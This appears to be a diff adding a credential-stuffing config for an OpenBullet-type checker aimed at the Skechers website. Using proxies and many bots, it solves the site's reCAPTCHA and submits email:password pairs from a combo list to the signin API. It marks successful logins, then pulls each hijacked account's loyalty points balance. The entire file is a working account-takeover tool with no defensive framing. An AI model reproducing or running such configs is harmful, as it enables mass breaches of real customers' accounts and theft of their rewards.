@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Skechers",
+  "SuggestedBots": 50,
+  "LastModified": "2018-06-23T23:44:45.4571695+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://www.skechers.com/en-us/secure/signin" "6Lc6b0MUAAAAABpEL4aDOshWRzoiHi1mA-Ltrl60" -> VAR "RECAP" 
+REQUEST POST "https://www.skechers.com/en-us/secure/api/signin" AutoRedirect=TRUE 
+  CONTENT "{\"mask\":true,\"email\":\"<USER>\",\"password\":\"<PASS>\",\"token\":\"<RECAP>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "referer: https://www.skechers.com/en-us/secure/signin" 
+  HEADER "origin: https://www.skechers.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage" 
+  KEYCHAIN Success OR 
+    KEY "signedin" 
+REQUEST GET "https://www.skechers.com/en-us/secure/api/crm" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "referer: https://www.skechers.com/en-us/secure/account/home" 
+PARSE "<SOURCE>" JSON "totalPts" Recursive=FALSE -> CAP "POINTS" "" "" 
